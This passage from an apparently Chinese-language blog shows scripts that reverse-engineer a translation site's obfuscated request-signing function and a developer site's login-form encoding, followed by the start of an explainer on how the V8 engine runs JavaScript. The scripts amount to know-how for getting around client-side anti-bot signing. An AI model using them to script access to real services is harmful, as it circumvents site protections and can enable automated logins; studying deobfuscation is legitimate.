function_">concat</span>(<span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(<span class="number">97</span>)) + <span class="string">&quot;&quot;</span>.<span class="title function_">concat</span>(<span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(<span class="number">94</span>)).<span class="title function_">concat</span>(<span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(<span class="number">43</span>)).<span class="title function_">concat</span>(<span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(<span class="number">54</span>)), k = <span class="string">&quot;&quot;</span>.<span class="title function_">concat</span>(<span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(<span class="number">43</span>)).<span class="title function_">concat</span>(<span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(<span class="number">45</span>)).<span class="title function_">concat</span>(<span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(<span class="number">51</span>)) + <span class="string">&quot;&quot;</span>.<span class="title function_">concat</span>(<span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(<span class="number">94</span>)).<span class="title function_">concat</span>(<span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(<span class="number">43</span>)).<span class="title function_">concat</span>(<span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(<span class="number">98</span>)) + <span class="string">&quot;&quot;</span>.<span class="title function_">concat</span>(<span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(<span class="number">43</span>)).<span class="title function_">concat</span>(<span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(<span class="number">45</span>)).<span class="title function_">concat</span>(<span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(<span class="number">102</span>)), x = <span class="number">0</span>; x &lt; g.<span class="property">length</span>; x++)</span><br><span class="line">    b = <span class="title function_">n</span>(b += g[x], w);</span><br><span class="line">  <span class="keyword">return</span> b = <span class="title function_">n</span>(b, k),</span><br><span class="line">  (b ^= m) &lt; <span class="number">0</span> &amp;&amp; (b = <span class="number">2147483648</span> + (<span class="number">2147483647</span> &amp; b)),</span><br><span class="line">  <span class="string">&quot;&quot;</span>.<span class="title function_">concat</span>((b %= <span class="number">1e6</span>).<span class="title function_">toString</span>(), <span class="string">&quot;.&quot;</span>).<span class="title function_">concat</span>(b ^ f)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> query = <span class="string">&quot;abandon&quot;</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">b</span>(query))</span><br></pre></td></tr></table></figure><p>运行时报错，提示<code>r</code>未定义。在继续动调去找<code>r</code>是什么。步进调试到这一步时，发现<code>r</code>被赋值为<code>window[d]</code>，即 “320305.131321201”，在此之前其值一直为null。</p><p><img src="https://img.ma5hr00m.top/blog/20240222095453.png" alt="20240222095453"></p><p>我们可以发现<code>d</code>的值为<code>gtk</code>。我们本地是通过 Node.js 运行 JS 脚本，没有<code>window[]</code>这种 Web API，所以直接将<code>320305.131321201</code>硬编码进去。在此运行脚本，又会提示缺少<code>n</code>函数：</p><p><img src="https://img.ma5hr00m.top/blog/20240222095459.png" alt="20240222095459"></p><p>我们在面板中找到<code>n</code>函数，光标悬浮于上方可直接跳转到函数声明的地方：</p><p><img src="https://img.ma5hr00m.top/blog/20240222095511.png" alt="20240222095511"></p><p>找到<code>n</code>函数后将其添加到 JS 脚本中，再次运行，即可得到结果<code>103339.356506</code>，这与我们在 Network 模块中查看到的<code>sign</code>值相同。</p><p>最终脚本如下，输入<code>query</code>的值即可得到请求<code>/v2transapi</code>所需的 payload：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * function to generate sign</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">n = <span class="keyword">function</span> (<span class="params">t, e</span>) &#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> n = <span class="number">0</span>; n &lt; e.<span class="property">length</span> - <span class="number">2</span>; n += <span class="number">3</span>) &#123;</span><br><span class="line">      <span class="keyword">var</span> r = e.<span class="title function_">charAt</span>(n + <span class="number">2</span>);</span><br><span class="line">      r = <span class="string">&quot;a&quot;</span> &lt;= r ? r.<span class="title function_">charCodeAt</span>(<span class="number">0</span>) - <span class="number">87</span> : <span class="title class_">Number</span>(r),</span><br><span class="line">      r = <span class="string">&quot;+&quot;</span> === e.<span class="title function_">charAt</span>(n + <span class="number">1</span>) ? t &gt;&gt;&gt; r : t &lt;&lt; r,</span><br><span class="line">      t = <span class="string">&quot;+&quot;</span> === e.<span class="title function_">charAt</span>(n) ? t + r &amp; <span class="number">4294967295</span> : t ^ r</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> t</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">b = <span class="keyword">function</span>(<span class="params">t</span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> o, i = t.<span class="title function_">match</span>(<span class="regexp">/[\uD800-\uDBFF][\uDC00-\uDFFF]/g</span>);</span><br><span class="line">  <span class="keyword">if</span> (<span class="literal">null</span> === i) &#123;</span><br><span class="line">    <span class="keyword">var</span> a = t.<span class="property">length</span>;</span><br><span class="line">    a &gt; <span class="number">30</span> &amp;&amp; (t = <span class="string">&quot;&quot;</span>.<span class="title function_">concat</span>(t.<span class="title function_">substr</span>(<span class="number">0</span>, <span class="number">10</span>)).<span class="title function_">concat</span>(t.<span class="title function_">substr</span>(<span class="title class_">Math</span>.<span class="title function_">floor</span>(a / <span class="number">2</span>) - <span class="number">5</span>, <span class="number">10</span>)).<span class="title function_">concat</span>(t.<span class="title function_">substr</span>(-<span class="number">10</span>, <span class="number">10</span>)))</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> s = t.<span class="title function_">split</span>(<span class="regexp">/[\uD800-\uDBFF][\uDC00-\uDFFF]/</span>), c = <span class="number">0</span>, u = s.<span class="property">length</span>, l = []; c &lt; u; c++)</span><br><span class="line">      <span class="string">&quot;&quot;</span> !== s[c] &amp;&amp; l.<span class="property">push</span>.<span class="title function_">apply</span>(l, <span class="keyword">function</span>(<span class="params">t</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title class_">Array</span>.<span class="title function_">isArray</span>(t))</span><br><span class="line">          <span class="keyword">return</span> <span class="title function_">e</span>(t)</span><br><span class="line">      &#125;(o = s[c].<span class="title function_">split</span>(<span class="string">&quot;&quot;</span>)) || <span class="keyword">function</span>(<span class="params">t</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="string">&quot;undefined&quot;</span> != <span class="keyword">typeof</span> <span class="title class_">Symbol</span> &amp;&amp; <span class="literal">null</span> != t[<span class="title class_">Symbol</span>.<span class="property">iterator</span>] || <span class="literal">null</span> != t[<span class="string">&quot;@@iterator&quot;</span>])</span><br><span class="line">          <span class="keyword">return</span> <span class="title class_">Array</span>.<span class="title function_">from</span>(t)</span><br><span class="line">      &#125;(o) || <span class="keyword">function</span>(<span class="params">t, n</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (t) &#123;</span><br><span class="line">          <span class="keyword">if</span> (<span class="string">&quot;string&quot;</span> == <span class="keyword">typeof</span> t)</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_">e</span>(t, n);</span><br><span class="line">          <span class="keyword">var</span> r = <span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">toString</span>.<span class="title function_">call</span>(t).<span class="title function_">slice</span>(<span class="number">8</span>, -<span class="number">1</span>);</span><br><span class="line">          <span class="keyword">return</span> <span class="string">&quot;Object&quot;</span> === r &amp;&amp; t.<span class="property">constructor</span> &amp;&amp; (r = t.<span class="property">constructor</span>.<span class="property">name</span>),</span><br><span class="line">          <span class="string">&quot;Map&quot;</span> === r || <span class="string">&quot;Set&quot;</span> === r ? <span class="title class_">Array</span>.<span class="title function_">from</span>(t) : <span class="string">&quot;Arguments&quot;</span> === r || <span class="regexp">/^(?:Ui|I)nt(?:8|16|32)(?:Clamped)?Array$/</span>.<span class="title function_">test</span>(r) ? <span class="title function_">e</span>(t, n) : <span class="keyword">void</span> <span class="number">0</span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;(o) || <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">TypeError</span>(<span class="string">&quot;Invalid attempt to spread non-iterable instance.\nIn order to be iterable, non-array objects must have a [Symbol.iterator]() method.&quot;</span>)</span><br><span class="line">      &#125;()),</span><br><span class="line">      c !== u - <span class="number">1</span> &amp;&amp; l.<span class="title function_">push</span>(i[c]);</span><br><span class="line">    <span class="keyword">var</span> p = l.<span class="property">length</span>;</span><br><span class="line">    p &gt; <span class="number">30</span> &amp;&amp; (t = l.<span class="title function_">slice</span>(<span class="number">0</span>, <span class="number">10</span>).<span class="title function_">join</span>(<span class="string">&quot;&quot;</span>) + l.<span class="title function_">slice</span>(<span class="title class_">Math</span>.<span class="title function_">floor</span>(p / <span class="number">2</span>) - <span class="number">5</span>, <span class="title class_">Math</span>.<span class="title function_">floor</span>(p / <span class="number">2</span>) + <span class="number">5</span>).<span class="title function_">join</span>(<span class="string">&quot;&quot;</span>) + l.<span class="title function_">slice</span>(-<span class="number">10</span>).<span class="title function_">join</span>(<span class="string">&quot;&quot;</span>))</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> d = <span class="string">&quot;&quot;</span>.<span class="title function_">concat</span>(<span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(<span class="number">103</span>)).<span class="title function_">concat</span>(<span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(<span class="number">116</span>)).<span class="title function_">concat</span>(<span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(<span class="number">107</span>)), h = (r = <span class="string">&quot;320305.131321201&quot;</span>).<span class="title function_">split</span>(<span class="string">&quot;.&quot;</span>), f = <span class="title class_">Number</span>(h[<span class="number">0</span>]) || <span class="number">0</span>, m = <span class="title class_">Number</span>(h[<span class="number">1</span>]) || <span class="number">0</span>, g = [], y = <span class="number">0</span>, v = <span class="number">0</span>; v &lt; t.<span class="property">length</span>; v++) &#123;</span><br><span class="line">    <span class="keyword">var</span> _ = t.<span class="title function_">charCodeAt</span>(v);</span><br><span class="line">    _ &lt; <span class="number">128</span> ? g[y++] = _ : (_ &lt; <span class="number">2048</span> ? g[y++] = _ &gt;&gt; <span class="number">6</span> | <span class="number">192</span> : (<span class="number">55296</span> == (<span class="number">64512</span> &amp; _) &amp;&amp; v + <span class="number">1</span> &lt; t.<span class="property">length</span> &amp;&amp; <span class="number">56320</span> == (<span class="number">64512</span> &amp; t.<span class="title function_">charCodeAt</span>(v + <span class="number">1</span>)) ? (_ = <span class="number">65536</span> + ((<span class="number">1023</span> &amp; _) &lt;&lt; <span class="number">10</span>) + (<span class="number">1023</span> &amp; t.<span class="title function_">charCodeAt</span>(++v)),</span><br><span class="line">    g[y++] = _ &gt;&gt; <span class="number">18</span> | <span class="number">240</span>,</span><br><span class="line">    g[y++] = _ &gt;&gt; <span class="number">12</span> &amp; <span class="number">63</span> | <span class="number">128</span>) : g[y++] = _ &gt;&gt; <span class="number">12</span> | <span class="number">224</span>,</span><br><span class="line">    g[y++] = _ &gt;&gt; <span class="number">6</span> &amp; <span class="number">63</span> | <span class="number">128</span>),</span><br><span class="line">    g[y++] = <span class="number">63</span> &amp; _ | <span class="number">128</span>)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> b = f, w = <span class="string">&quot;&quot;</span>.<span class="title function_">concat</span>(<span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(<span class="number">43</span>)).<span class="title function_">concat</span>(<span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(<span class="number">45</span>)).<span class="title function_">concat</span>(<span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(<span class="number">97</span>)) + <span class="string">&quot;&quot;</span>.<span class="title function_">concat</span>(<span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(<span class="number">94</span>)).<span class="title function_">concat</span>(<span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(<span class="number">43</span>)).<span class="title function_">concat</span>(<span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(<span class="number">54</span>)), k = <span class="string">&quot;&quot;</span>.<span class="title function_">concat</span>(<span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(<span class="number">43</span>)).<span class="title function_">concat</span>(<span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(<span class="number">45</span>)).<span class="title function_">concat</span>(<span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(<span class="number">51</span>)) + <span class="string">&quot;&quot;</span>.<span class="title function_">concat</span>(<span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(<span class="number">94</span>)).<span class="title function_">concat</span>(<span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(<span class="number">43</span>)).<span class="title function_">concat</span>(<span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(<span class="number">98</span>)) + <span class="string">&quot;&quot;</span>.<span class="title function_">concat</span>(<span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(<span class="number">43</span>)).<span class="title function_">concat</span>(<span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(<span class="number">45</span>)).<span class="title function_">concat</span>(<span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(<span class="number">102</span>)), x = <span class="number">0</span>; x &lt; g.<span class="property">length</span>; x++)</span><br><span class="line">    b = <span class="title function_">n</span>(b += g[x], w);</span><br><span class="line">  <span class="keyword">return</span> b = <span class="title function_">n</span>(b, k),</span><br><span class="line">  (b ^= m) &lt; <span class="number">0</span> &amp;&amp; (b = <span class="number">2147483648</span> + (<span class="number">2147483647</span> &amp; b)),</span><br><span class="line">  <span class="string">&quot;&quot;</span>.<span class="title function_">concat</span>((b %= <span class="number">1e6</span>).<span class="title function_">toString</span>(), <span class="string">&quot;.&quot;</span>).<span class="title function_">concat</span>(b ^ f)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * test</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">const</span> query = <span class="string">&quot;abandon&quot;</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`from=en&amp;to=zh&amp;query=<span class="subst">$&#123;query&#125;</span>&amp;simple_means_flag=3&amp;sign=<span class="subst">$&#123;b(query)&#125;</span>&amp;token=14025658070b41f40739347cef0ec62a&amp;domain=common&amp;ts=1708512893507`</span>)</span><br></pre></td></tr></table></figure><h3 id="掘金登录接口"><a href="#掘金登录接口" class="headerlink" title="掘金登录接口"></a>掘金登录接口</h3><p>登录时抓包，可以得到对<code>/passport/web/user/login</code>接口的请求报文：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"># GET 查询字符串参数</span><br><span class="line">aid: 2608</span><br><span class="line">account_sdk_source: web</span><br><span class="line">sdk_version: 2.2.6</span><br><span class="line">verifyFp: verify_lsom0d3u_s6mZvQBP_pamX_41TO_81V1_VRng2UjxFI79</span><br><span class="line">fp: verify_lsom0d3u_s6mZvQBP_pamX_41TO_81V1_VRng2UjxFI79</span><br><span class="line">sign: d9116c9cae3fcdf848f1288e1850eb2a489a4e23ece930692912a8bc155d89ec</span><br><span class="line">qs: 6466666a706b715a76616e5a766a7077666029646c612963752976616e5a736077766c6a6b297360776c637c4375</span><br><span class="line"></span><br><span class="line"># POST 表单参数</span><br><span class="line">mix_mode: 1</span><br><span class="line">account: 34363d3336373d3d343c3c</span><br><span class="line">password: 343736343736343736</span><br><span class="line">fixed_mix_mode: 1</span><br></pre></td></tr></table></figure><p>流程其实大差不差，就是搜参数、打断点、慢慢动调，基本都能找出来。掘金登录只需要 POST 表单参数正确即可，GET 参数不对也能过。以上参数中，会动态变化的只有<code>sign</code>、<code>account</code>和<code>password</code>，其中 GET 参数<code>sign</code>即使删掉也能过登录验证。</p><p>具体过程不再贴图展示，这里直接提供获取 POST 表单参数的脚本，感兴趣的可以尝试去逆一下<code>sign</code>是如何生成的，难度比逆<code>account</code>和<code>password</code>要高一些：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * raw data</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">const</span> account = <span class="string">&#x27;00000000000&#x27;</span></span><br><span class="line"><span class="keyword">const</span> password = <span class="string">&#x27;1q2w3e&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * handle account and password</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">var</span> T = <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> t, n = [];</span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">void</span> <span class="number">0</span> === e)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">  t = <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> t, n = e.<span class="title function_">toString</span>(), r = [], a = <span class="number">0</span>; a &lt; n.<span class="property">length</span>; a++)</span><br><span class="line">      <span class="number">0</span> &lt;= (t = n.<span class="title function_">charCodeAt</span>(a)) &amp;&amp; t &lt;= <span class="number">127</span> ? r.<span class="title function_">push</span>(t) : <span class="number">128</span> &lt;= t &amp;&amp; t &lt;= <span class="number">2047</span> ? (r.<span class="title function_">push</span>(<span class="number">192</span> | <span class="number">31</span> &amp; t &gt;&gt; <span class="number">6</span>),</span><br><span class="line">      r.<span class="title function_">push</span>(<span class="number">128</span> | <span class="number">63</span> &amp; t)) : (<span class="number">2048</span> &lt;= t &amp;&amp; t &lt;= <span class="number">55295</span> || <span class="number">57344</span> &lt;= t &amp;&amp; t &lt;= <span class="number">65535</span>) &amp;&amp; (r.<span class="title function_">push</span>(<span class="number">224</span> | <span class="number">15</span> &amp; t &gt;&gt; <span class="number">12</span>),</span><br><span class="line">      r.<span class="title function_">push</span>(<span class="number">128</span> | <span class="number">63</span> &amp; t &gt;&gt; <span class="number">6</span>),</span><br><span class="line">      r.<span class="title function_">push</span>(<span class="number">128</span> | <span class="number">63</span> &amp; t));</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; r.<span class="property">length</span>; i++)</span><br><span class="line">      r[i] &amp;= <span class="number">255</span>;</span><br><span class="line">    <span class="keyword">return</span> r</span><br><span class="line">  &#125;(e);</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> r = <span class="number">0</span>, a = t.<span class="property">length</span>; r &lt; a; ++r)</span><br><span class="line">    n.<span class="title function_">push</span>((<span class="number">5</span> ^ t[r]).<span class="title function_">toString</span>(<span class="number">16</span>));</span><br><span class="line">  <span class="keyword">return</span> n.<span class="title function_">join</span>(<span class="string">&quot;&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * obtain the post form</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">const</span> postForm = <span class="string">`mix_mode=1&amp;account=<span class="subst">$&#123;T(account)&#125;</span>&amp;password=<span class="subst">$&#123;T(password)&#125;</span>&amp;fixed_mix_mode=1`</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(postForm)</span><br></pre></td></tr></table></figure><h3 id="HGAME2024-2048-16"><a href="#HGAME2024-2048-16" class="headerlink" title="HGAME2024 2048*16"></a>HGAME2024 2048*16</h3><p>BaiMeow 师傅的题，HGAME2024 Week1 结束后不方便提供复现环境。题目考察了禁用 F12、反调试、JS 反混淆，比较全面。这里提一嘴。</p><h2 id="参阅文章"><a href="#参阅文章" class="headerlink" title="参阅文章"></a>参阅文章</h2><ul><li><a href="https://lizh.gitbook.io/knowledge/research/javascript-jia-mi-hun-xiao#hun-xiao-cha-jian">Javascript加密混淆</a>，by 前端知识库</li><li><a href="https://ek1ng.com/jsobuscation.html">js混淆与反混淆</a>，by ek1ng</li></ul>]]></content>
      
      
      <categories>
          
          <category> Security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaScript </tag>
            
            <tag> JavaScript Deobfuscation </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JavaScript执行原理</title>
      <link href="/2024/02/10/2024/how-js-run/"/>
      <url>/2024/02/10/2024/how-js-run/</url>
      
        <content type="html"><![CDATA[<p>最近在复习 JavaScript 反混淆相关内容，正好给执行原理补个档，之前旧版的随旧博客一起遗失了，这里重新写了一篇。</p><p>预计之后还会有 <a href="#">JavaScript执行原理·补</a> 和 <a href="#">JavaScript混淆&#x2F;反混淆</a>，慢慢写吧。</p><p>:::tip</p><p>跳转到 <a href="https://ma5hr00m.top/archives/2024/02/js-obfuscation-deobfuscation.html">JavaScript混淆&#x2F;反混淆</a></p><p>:::</p><h2 id="JavaScript"><a href="#JavaScript" class="headerlink" title="JavaScript"></a>JavaScript</h2><p>JavaScript 是一门解释型语言，与 C&#x2F;Golang 等静态编译语言不同。静态编译型语言通过编译器直接将代码转化为机器码，然后运行在机器上；JS 是先经过编译产生字节码，然后在虚拟机上运行字节码（这点与 Java&amp;JVM 很相似），性能虽不及静态编译型语言，但获得了更多的灵活性。</p><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><h3 id="JS-Engine-引擎"><a href="#JS-Engine-引擎" class="headerlink" title="JS Engine 引擎"></a>JS Engine 引擎</h3><p>为什么需要 <a href="https://en.wikipedia.org/wiki/JavaScript_engine">JS Engine</a>🤔️？</p><p>JS Engine 其实就可以理解为上文中所说的虚拟机。机器底层的 CPU 只能执行指令集中的指令（即对应的汇编代码），无法直接识别高级语言。JS Engine 可以将 JS 代码编译为字节码，然后执行代码，同时还提供了分配内存和垃圾回收的功能，极大程度上减轻了开发人员的工作量，何乐而不为。</p><p>从本质上来讲，JS Engine 就是一段程序，用于实现上述功能。</p><p>互联网中最常见、使用最广泛的 JS Engine 是 <strong>Google V8</strong>。Google V8 是用 C++ 编写的开源高性能 JS Engine（同时也是 WebAssembly Engine），目前已被用于 Chrome 浏览器、Node.js、MongoDB 等多个知名项目。Chrome 占据了全球浏览器市场 60% 的份额，而 Node.js 已然成为服务器端 JS 代码的执行标准，由此可见 V8 使用之广泛。</p><p>除此之外，还有一些常见的 JS Engine：</p><ul><li>由 Mozilla 为 Firefox 开发的 SpiderMonkey</li><li>为 Safari 浏览器提供支持的 JavaScriptCore</li><li>为 IE 提供支持的 Chakra</li></ul><p>本篇接下来的 JS Engine 都默认为 Google V8。</p><h3 id="JS-Runtime-运行时"><a href="#JS-Runtime-运行时" class="headerlink" title="JS Runtime 运行时"></a>JS Runtime 运行时</h3><p>我们可以把 JS Runtime 理解为一栋房子，JS 代码都需要在这栋房子中运行。而这栋房子由很多部分共同组成，包括 JS Engine、外部 API 和回调队列（callback queue）。有时也把 JS 用到的 core lib 核心库看作 Runtime 的一部分。</p><p><img src="https://img.ma5hr00m.top/blog/20240221083858.png" alt="20240221083858"></p><p>以 Chrome 浏览器的 JS Runtime 举例，浏览器的 Runtime 由对应的 JS Engine、Web API 和回调队列组成。JS Engine 在上文中有讲，不再赘述；Web API 是浏览器提供给 Engine 的一系列接口，并不是 JS 的一部分，目的是方便操纵数据和增强浏览器的功能，常用的 Web API 包括 DOM、Web Worker 等；回调队列包括准备好执行的回调函数，回调队列确保回调以先进先出（FIFO）方法执行，并在堆栈为空时将其传递到堆栈中。</p><p>与浏览器 Runtime 不同的是，Node.js 没有 Web API，而是有叫作 C++ 绑定和线程池的其他部分。</p><p>我们可以这样说，Chrome 和 Node.js 中的 JS 代码都依赖于 V8 运行，但它们运行在不同的 Runtime 中。</p><p>在开始之前，我们要知道，V8 是一个非常复杂的项目，有超过 100w 行代码。我们可以根据功能将 V8 Engine 分为不同的子模块，其中最重要的四个子模块分别是：</p><ul><li><a href="https://v8.dev/blog/scanner">Parser</a>：解析器，将 JS 源码转换为抽象语法树（AST）；</li><li><a href="https://v8.dev/docs/ignition">Ignition</a>：解释器，将 AST 转换为字节码（Bytecode），然后解释执行 Bytecode，同时收集 TurboFan 优化编译所需的信息，比如函数参数的类型；</li><li><a href="https://v8.dev/docs/turbofan">TurboFan</a>：编译器，利用 Ignitio 所收集的类型信息，将 Bytecode 转换为优化后的汇编代码；</li><li><a href="https://v8.dev/blog/trash-talk">Orinoco</a>：垃圾回收模块，负责将程序不再需要的内存空间回收；</li></ul><p>前三个子模块可以代表 JS 运行的主要三个阶段：解析、解释、编译，最后运行。接下来，我会以 V8 Engine 为例，讲讲 JS 代码到底是如何从编写到运行的。</p><h2 id="Parser-解析"><a href="#Parser-解析" class="headerlink" title="Parser 解析"></a>Parser 解析</h2><p>Parser 的功能是将 JS 源码转化为 AST。更确切地说，源码是先经过词法分析转化为 Token，然后 Toekn 经过语法分析转换为 AST。</p><h3 id="Lexing-词法分析"><a href="#Lexing-词法分析" class="headerlink" title="Lexing 词法分析"></a>Lexing 词法分析</h3><p><strong>词法分析</strong> 这个过程会将由字符组成的字符串分解成代码块，这些代码块被称为“词法单元”（Token）。从数据方面来说，这一步是字符流（char stream）转换为标记流（token stream）。</p><p>我们编写一个<code>main.js</code>文件，写入以下内容：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> a = <span class="number">3</span>;</span><br></pre></td></tr></table></figure><p>以这段代码为例，会被分为<code>const</code>、<code>a</code>、<code>=</code>、<code>3</code>、<code>;</code>词法单元。<code>space</code>是否被当作词法单元，取决于其在当前编程语言中是否有意义，JS 中的空格是无意义，不会被当作词法单元。</p><p>以下为经过词法分析的 JSON 格式的 Tokens：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">[</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Keyword&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;const&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Identifier&quot;</span><span 